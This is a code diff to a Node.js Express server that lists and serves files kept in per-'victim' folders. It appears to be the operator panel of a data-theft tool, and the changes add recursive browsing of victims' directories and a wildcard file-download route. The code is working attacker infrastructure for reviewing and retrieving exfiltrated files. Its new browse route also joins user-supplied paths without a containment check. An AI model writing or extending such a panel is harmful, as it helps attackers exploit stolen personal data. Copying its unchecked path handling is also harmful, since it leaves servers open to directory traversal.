@@ -69,14 +69,44 @@ app.post("/send", async (req, res) => {
   }
 });
 
-// --- Browse victim files ---
+// --- Browse victim files (recursive) ---
+app.get("/victim/:id/*", async (req, res) => {
+  const safeId = path.basename(req.params.id);
+  const subPath = req.params[0] || "";
+  const victimDir = path.join(VICTIMS_DIR, safeId);
+  const currentDir = path.join(victimDir, subPath);
+
+  let items = [];
+  try {
+    items = await fs.readdir(currentDir, { withFileTypes: true });
+  } catch (err) {
+    console.error("Failed to read folder:", err);
+    return res.status(404).send("Not found");
+  }
+
+  const parentDir = subPath ? path.dirname(subPath) : "";
+  const backLink = parentDir && parentDir !== "." 
+    ? `<a href="/victim/${safeId}/${parentDir.replace(/\\/g, "/")}">⬅️ ..</a><br>` 
+    : "";
+
+  res.send(
+    `<h2>Victim: ${safeId}${subPath ? "/" + subPath.replace(/\\/g, "/") : ""}</h2>
+    ${backLink}
+    <ul>${items.map(item => {
+      const href = `/victim/${safeId}/${path.join(subPath, item.name).replace(/\\/g, "/")}`;
+      return `<li>${item.isDirectory() ? "📁 " : "📄 "}<a href="${href}">${item.name}</a></li>`;
+    }).join("")}</ul>`
+  );
+});
+
+// --- Root victim view ---
 app.get("/victim/:id", async (req, res) => {
   const safeId = path.basename(req.params.id);
   const victimDir = path.join(VICTIMS_DIR, safeId);
 
-  let files = [];
+  let items = [];
   try {
-    files = await fs.readdir(victimDir);
+    items = await fs.readdir(victimDir, { withFileTypes: true });
   } catch (err) {
     console.error("Failed to read victim folder:", err);
     return res.status(404).send("Not found");
@@ -84,19 +114,27 @@ app.get("/victim/:id", async (req, res) => {
 
   res.send(
     `<h2>Victim: ${safeId}</h2>
-    <ul>${files.map(f => `<li><a href="/victim/${safeId}/${f}">${f}</a></li>`).join("")}</ul>`
+    <ul>${items.map(item => {
+      const href = `/victim/${safeId}/${item.name}`;
+      return `<li>${item.isDirectory() ? "📁 " : "📄 "}<a href="${href}">${item.name}</a></li>`;
+    }).join("")}</ul>`
   );
 });
 
 // --- Download specific file ---
-app.get("/victim/:id/:file", async (req, res) => {
-  const filePath = path.join(
-    VICTIMS_DIR,
-    path.basename(req.params.id),
-    req.params.file
-  );
+app.get("/victim/:id/:file(*)", async (req, res) => {
+  const safeId = path.basename(req.params.id);
+  const filePath = path.join(VICTIMS_DIR, safeId, req.params.file);
+  
+  if (!filePath.startsWith(path.join(VICTIMS_DIR, safeId))) {
+    return res.status(403).send("Invalid path");
+  }
+  
   res.download(filePath, err => {
-    if (err) console.error("Download failed:", err);
+    if (err) {
+      console.error("Download failed:", err);
+      res.status(404).send("File not found");
+    }
   });
 });
 
